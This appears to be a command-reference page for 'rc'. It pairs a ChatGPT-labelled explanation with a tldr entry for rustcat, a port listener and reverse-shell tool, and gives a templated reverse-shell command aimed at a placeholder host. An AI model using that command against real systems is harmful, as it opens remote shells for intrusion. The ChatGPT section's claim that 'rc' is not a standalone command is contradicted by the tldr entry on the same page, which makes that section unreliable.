# rc 
## chatgpt 
The command "rc" is not a complete command on its own, as it needs to be followed by additional arguments to specify what specific "rc" command needs to be executed. 
However, "rc" is often used as shorthand for a familiar command, "run command". 

In the context of Unix/Linux operating systems, the "rc" command may refer to:

1. rc file - This is a configuration file where initialization commands are stored for various processes, shells and daemons to read and execute during startup. The common use of the "rc" file is to define environment variables, aliases, and other settings that configure the user's shell environment. Depending on the shell, the rc file could be .bashrc, .zshrc, or .tcshrc, among others.

2. rc.local - This is a startup script used to define local system settings and configurations on some Linux distributions. It is typically used to set up network interfaces, mount file systems, start services, and run scripts.

3. rc.d - This directory contains the init scripts for system services and daemons, which are responsible for starting, stopping or restarting system services when the Linux system is booted or shut down. 

In essence, running "rc" as a command in Linux or Unix may not have any effect, as it is not a standalone command. Specific arguments associated with "rc" must be provided, depending on the context in which the command is being used, for it to have any practical use. 

## tldr 
 
> A modern simplistic port listener & reverse shell.
> Similar to `nc`.
> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening on a specific port:

`rc -lp {{port}}`

- Start a reverse shell:

`rc {{host}} {{port}} -r {{shell}}`
